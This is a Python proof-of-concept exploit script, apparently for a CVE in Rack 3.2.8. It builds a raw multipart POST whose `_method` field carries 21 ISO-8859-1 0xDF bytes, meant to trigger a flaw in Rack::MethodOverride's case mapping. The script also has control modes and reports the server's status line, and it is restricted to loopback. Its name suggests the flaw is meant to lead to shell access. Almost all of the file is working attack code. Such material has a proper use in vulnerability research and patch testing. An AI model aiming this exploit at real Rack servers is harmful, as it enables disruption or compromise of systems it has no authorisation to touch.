#!/usr/bin/env python3
"""Wire-only multipart _method arm for CVE-2026-132825. Loopback only.

Rack 3.2.8's multipart parser tags a part body with the charset named in that
part's Content-Type. Rack::MethodOverride then calls `.to_s.upcase` on the
`_method` value. A 21-byte ISO-8859-1 0xDF body therefore reaches the
single-byte case_map expansion with attacker-chosen content, from the wire,
with no middleware, monkey patch or debugger in the request path.

Usage: ruby2shell-mp-method-21.py PORT [attack|safe-ascii|safe-utf8|canary]
Prints the HTTP status line; exits 0 on any response.
"""

import socket
import sys

HOST = "127.0.0.1"
BOUNDARY = b"X2SMPBOUND"


def multipart(field, payload, charset):
    disp = b'Content-Disposition: form-data; name="' + field + b'"'
    ctype = b"text/plain; charset=" + charset
    part = (
        b"--" + BOUNDARY + b"\r\n"
        + disp + b"\r\n"
        + b"Content-Type: " + ctype + b"\r\n\r\n"
        + payload + b"\r\n"
    )
    return part + b"--" + BOUNDARY + b"--\r\n"


def request(port, body, field=b"_method"):
    req = (
        b"POST /not-a-route HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"Connection: close\r\n"
        b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
        + body
    )
    try:
        with socket.create_connection((HOST, port), timeout=10) as sock:
            sock.sendall(req)
            chunks = []
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                chunks.append(data)
        return b"".join(chunks).split(b"\r\n", 1)[0].decode("latin-1")
    except Exception as exc:
        return "ERR %s: %s" % (type(exc).__name__, exc)


def main():
    port = int(sys.argv[1])
    mode = sys.argv[2] if len(sys.argv) > 2 else "attack"
    shapes = {
        "attack": (b"\xdf" * 21, b"ISO-8859-1", b"_method"),
        "safe-ascii": (b"A" * 21, b"ISO-8859-1", b"_method"),
        "safe-utf8": (b"\xdf" * 21, b"UTF-8", b"_method"),
        "canary": (b"CASECANARY123", b"ISO-8859-1", b"_method"),
        "other-field": (b"\xdf" * 21, b"ISO-8859-1", b"q"),
    }
    payload, charset, field = shapes[mode]
    print("mode=%s charset=%s field=%s bytes=%s status=%s" % (
        mode, charset.decode(), field.decode(), payload[:8].hex(),
        request(port, multipart(field, payload, charset)),
    ))


if __name__ == "__main__":
    main()
